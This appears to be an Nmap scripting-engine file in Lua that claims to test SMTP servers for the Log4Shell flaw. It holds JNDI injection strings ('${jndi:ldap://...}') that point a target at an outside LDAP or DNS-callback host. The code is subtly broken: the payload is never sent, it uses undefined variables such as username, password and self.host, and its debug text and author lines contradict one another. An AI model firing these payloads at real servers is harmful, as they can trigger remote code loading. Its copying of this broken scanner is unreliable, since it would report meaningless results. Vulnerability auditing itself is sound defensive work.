local shortport = require "shortport"
local smtp = require "smtp"
local stdnse = require "stdnse"

description = [[
Performs log4shell auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.
]]

---
-- @usage
-- nmap -p 25 --script smtp-log4shell <host>
--
-- @output
-- PORT    STATE SERVICE REASON
-- 25/tcp  open  stmp    syn-ack
--

-- Version 0.1
-- Created 2021-12-14 - v0.1 - created by Vlatko Kosturjak <kost@linux.hr>


author = "Patrik Karlsson"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"log4shell","intrusive"}

portrule = shortport.port_or_service({ 25, 465, 587 },
                { "smtp", "smtps", "submission" })

local mech

local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
local gpayload = stdnse.get_script_args("log4shell.payload")



local function fail (err) return stdnse.format_output(false, err) end

action = function(host, port)

  if not payload then
    if not gpayload then
      if nmap.registry['dnslog-cn'] then
	 stdnse.debug2("registry not present")
	 local registry = nmap.registry['dnslog-cn']
	 if registry.domain then
	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
	 else
	       stdnse.debug2("session not present")
	 end
      else
	 payload = "${jndi:ldap://mydomain/uri}"
      end
      stdnse.debug1("Setting the payload to default payload:"..payload)
    else
      payload=gpayload
    end
  end

  local socket, response = smtp.connect(host, port, { ssl = true, recv_before = true })
  if ( not(socket) ) then return fail("Failed to connect to SMTP server") end
  local status, response = smtp.ehlo(socket, smtp.get_domain(host))
  if ( not(status) ) then return fail("EHLO command failed, aborting ...") end
  local mechs = smtp.get_auth_mech(response)
  if ( not(mechs) ) then
    return fail("Failed to retrieve authentication mechanisms form server")
  end
  smtp.quit(socket)

  local mech_prio = stdnse.get_script_args("smtp-brute.auth")
  mech_prio = ( mech_prio and { mech_prio } ) or
    { "LOGIN", "PLAIN", "CRAM-MD5", "DIGEST-MD5", "NTLM" }

  for _, mp in ipairs(mech_prio) do
    for _, m in pairs(mechs) do
      if ( mp == m ) then
        mech = m
        break
      end
    end
    if ( mech ) then break end
  end

  socket = smtp.connect(self.host, self.port, { ssl = true, recv_before = true })
  local status, err = smtp.login( socket, username, password, mech )
  if ( status ) then
    smtp.quit(socket)
    return 'Valid credential. Weird response for: '.. password
  end
  if ( err:match("^error: failed to .*") ) then
    socket:close()
  end
  return
end
